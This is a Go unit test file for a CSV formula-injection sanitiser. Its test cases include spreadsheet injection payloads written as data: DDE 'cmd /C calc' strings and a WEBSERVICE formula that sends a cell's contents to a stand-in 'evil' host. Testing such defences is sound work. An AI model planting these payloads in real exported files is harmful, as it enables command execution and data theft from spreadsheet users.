package csvsafe

import (
	"bytes"
	"encoding/csv"
	"testing"
)

func TestCell(t *testing.T) {
	fullWidthEq := string(rune(0xff1d)) + "1+1"
	cases := map[string]string{
		"":                                   "",
		"Plain title":                        "Plain title",
		"https://ex.com/a?x=-1":              "https://ex.com/a?x=-1",
		"=HYPERLINK(\"https://evil\",\"x\")": "'=HYPERLINK(\"https://evil\",\"x\")",
		"=WEBSERVICE(\"https://evil/\"&A1)":  "'=WEBSERVICE(\"https://evil/\"&A1)",
		"+cmd|' /C calc'!A0":                 "'+cmd|' /C calc'!A0",
		"-2+3+cmd|' /C calc'!A0":             "'-2+3+cmd|' /C calc'!A0",
		"@SUM(1+1)*cmd|' /C calc'!A0":        "'@SUM(1+1)*cmd|' /C calc'!A0",
		"\t=1+1":                             "'\t=1+1",
		"\r=1+1":                             "'\r=1+1",
		"  =1+1":                             "'  =1+1",
		fullWidthEq:                          "'" + fullWidthEq,
		"- a list item":                      "'- a list item",
		"-3":                                 "-3", // numbers stay numbers
		"-0.25":                              "-0.25",
		"+1.5e3":                             "+1.5e3",
		"-.5":                                "-.5",
		"42":                                 "42",
		"1e-3":                               "1e-3",
		"-1-1":                               "'-1-1",
		"-Inf":                               "'-Inf",
		"-0x1p-2":                            "'-0x1p-2",
		" -3":                                "' -3",
	}
	for in, want := range cases {
		if got := Cell(in); got != want {
			t.Errorf("Cell(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestWriterNeutralisesFormulas(t *testing.T) {
	var buf bytes.Buffer
	w := NewWriter(&buf)
	in := []string{"https://ex.com/", "=1+1", "-7", "ok, \"quoted\""}
	if err := w.Write(in); err != nil {
		t.Fatal(err)
	}
	w.Flush()
	if in[1] != "=1+1" {
		t.Errorf("Write changed the caller's record: %q", in)
	}
	got, err := csv.NewReader(&buf).Read()
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"https://ex.com/", "'=1+1", "-7", "ok, \"quoted\""}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("cell %d = %q, want %q", i, got[i], want[i])
		}
	}
}

func TestWriteAll(t *testing.T) {
	var buf bytes.Buffer
	if err := NewWriter(&buf).WriteAll([][]string{{"a", "@x"}}); err != nil {
		t.Fatal(err)
	}
	if buf.String() != "a,'@x\n" {
		t.Errorf("WriteAll = %q", buf.String())
	}
}
